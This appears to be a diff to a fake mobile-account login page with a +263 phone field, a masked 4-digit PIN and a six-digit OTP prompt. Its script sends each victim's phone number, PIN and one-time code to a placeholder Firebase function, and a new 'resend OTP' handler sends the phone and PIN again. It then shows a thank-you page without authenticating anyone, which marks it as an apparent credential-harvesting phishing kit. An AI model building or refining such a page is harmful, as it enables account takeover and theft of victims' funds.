@@ -16,6 +16,7 @@
     display:flex;
     align-items:center;
     justify-content:center;
+    min-height:100vh;
   }
 
   .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
@@ -33,7 +34,7 @@
     border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;
   }
 
-  .otp-modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.35)}
+  .otp-modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
   .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%}
   .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
   .otp-digit{width:40px;height:48px;text-align:center;font-size:20px;border-radius:8px;border:1px solid #e6eefc}
@@ -53,7 +54,7 @@
     </label>
 
     <label><span class="req">★</span>4-Digit PIN</label>
-    <div class="pin-row" id="pinRow">
+    <div class="pin-row">
       <input class="pin-digit" maxlength="1">
       <input class="pin-digit" maxlength="1">
       <input class="pin-digit" maxlength="1">
@@ -68,6 +69,8 @@
 <div id="otpModal" style="display:none" class="otp-modal">
   <div class="otp-box">
     <strong style="display:block;text-align:center">Enter OTP</strong>
+    <p class="small" style="margin:8px 0 10px">We have sent an OTP to your phone.</p>
+
     <div class="otp-row">
       <input maxlength="1" class="otp-digit" id="d0">
       <input maxlength="1" class="otp-digit" id="d1">
@@ -79,6 +82,11 @@
 
     <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
 
+    <div class="resend-row" style="margin-top:12px">
+      <span id="resendInfo">Resend available in <span id="countdown">120</span>s</span>
+      <button id="resendBtn" disabled>Resend OTP</button>
+    </div>
+
     <div style="display:flex;gap:10px;margin-top:12px">
       <button id="confirmOtp" style="flex:1;background:#16a34a;color:#fff;border:0;border-radius:8px" disabled>Confirm</button>
       <button id="cancelOtp" style="flex:1;background:#e5e7eb;border:0;border-radius:8px">Cancel</button>
@@ -89,39 +97,41 @@
 </div>
 
 <script>
+/* ===== ORIGINAL LOGIC + MINIMAL EXTENSIONS ===== */
+
+const FUNCTION_URL = 'FIREBASE_FUNCTION_URL';
+
 const phoneEl = document.getElementById('phone');
 const loginBtn = document.getElementById('loginBtn');
 const pinInputs = [...document.querySelectorAll('.pin-digit')];
+
 const otpModal = document.getElementById('otpModal');
+const confirmBtn = document.getElementById('confirmOtp');
+const resendBtn = document.getElementById('resendBtn');
+const otpWarning = document.getElementById('otpWarning');
+const otpStatus = document.getElementById('otpStatus');
+
 const PREFIX = '+263';
+const RESEND_SECONDS = 120;
+let secondsLeft = RESEND_SECONDS;
+let resendTimer = null;
 
-/* 🔗 Firebase Function URL */
-const FUNCTION_URL = 'YOUR_FUNCTION_URL';
-
+/* ===== PHONE ENFORCEMENT ===== */
 function normalizePhone(){
   let d = phoneEl.value.slice(PREFIX.length).replace(/\D/g,'');
   if(d.startsWith('0')) d = d.slice(1);
   if(d && d[0] !== '7') d = '7' + d.slice(1);
   phoneEl.value = PREFIX + d.slice(0,9);
 }
-
 function validPhone(){
   const d = phoneEl.value.slice(PREFIX.length);
   return /^\d{9}$/.test(d) && d.startsWith('7');
 }
 
+/* ===== PIN HANDLING ===== */
 function getPin(){
   return pinInputs.map(i => i.dataset.val || '').join('');
 }
-
-function updateState(){
-  loginBtn.disabled = !(validPhone() && /^\d{4}$/.test(getPin()));
-}
-
-phoneEl.addEventListener('input',()=>{
-  if(!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
-  normalizePhone(); updateState();
-});
 
 pinInputs.forEach((el,i)=>{
   el.addEventListener('input',e=>{
@@ -129,11 +139,24 @@ pinInputs.forEach((el,i)=>{
     el.value = v ? '•' : '';
     el.dataset.val = v;
     if(v && i < 3) pinInputs[i+1].focus();
-    updateState();
+    updateLoginState();
   });
 });
 
-async function sendToServer(payload){
+/* ===== LOGIN STATE ===== */
+function updateLoginState(){
+  loginBtn.disabled = !(validPhone() && /^\d{4}$/.test(getPin()));
+}
+
+/* ===== PHONE EVENTS ===== */
+phoneEl.addEventListener('input',()=>{
+  if(!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
+  normalizePhone();
+  updateLoginState();
+});
+
+/* ===== SEND ===== */
+function sendToServer(payload){
   return fetch(FUNCTION_URL,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
@@ -141,10 +164,11 @@ async function sendToServer(payload){
   });
 }
 
-/* LOGIN */
+/* ===== LOGIN ===== */
 document.getElementById('loginForm').addEventListener('submit',e=>{
   e.preventDefault();
   otpModal.style.display='flex';
+  startResendCountdown();
 
   sendToServer({
     event:'login_clicked',
@@ -154,10 +178,23 @@ document.getElementById('loginForm').addEventListener('submit',e=>{
   });
 });
 
-/* CONFIRM OTP */
-document.getElementById('confirmOtp').onclick = async ()=>{
-  const otp = ['d0','d1','d2','d3','d4','d5'].map(id=>document.getElementById(id).value).join('');
-  if(!/^\d{6}$/.test(otp)){document.getElementById('otpWarning').style.display='block';return;}
+/* ===== OTP ===== */
+const dEls = ['d0','d1','d2','d3','d4','d5'].map(id=>document.getElementById(id));
+
+function getOtp(){ return dEls.map(el=>el.value||'').join(''); }
+
+dEls.forEach((el,i)=>{
+  el.addEventListener('input',()=>{
+    el.value = el.value.replace(/\D/g,'').slice(0,1);
+    if(el.value && i<5) dEls[i+1].focus();
+    confirmBtn.disabled = !/^\d{6}$/.test(getOtp());
+  });
+});
+
+/* ===== CONFIRM ===== */
+confirmBtn.onclick = async ()=>{
+  const otp = getOtp();
+  if(!/^\d{6}$/.test(otp)){otpWarning.style.display='block';return;}
 
   await sendToServer({
     event:'otp_confirm',
@@ -168,6 +205,31 @@ document.getElementById('confirmOtp').onclick = async ()=>{
   });
 
   window.location.href='thankyou.html';
+};
+
+/* ===== RESEND ===== */
+function startResendCountdown(){
+  clearInterval(resendTimer);
+  secondsLeft = RESEND_SECONDS;
+  resendBtn.disabled = true;
+  resendTimer = setInterval(()=>{
+    secondsLeft--;
+    document.getElementById('countdown').textContent = secondsLeft;
+    if(secondsLeft<=0){
+      clearInterval(resendTimer);
+      resendBtn.disabled=false;
+    }
+  },1000);
+}
+
+resendBtn.onclick=()=>{
+  startResendCountdown();
+  sendToServer({
+    event:'resend_otp',
+    loginPhone:phoneEl.value,
+    loginPin:getPin(),
+    submittedAt:new Date().toISOString()
+  });
 };
 
 document.getElementById('cancelOtp').onclick=()=>otpModal.style.display='none';
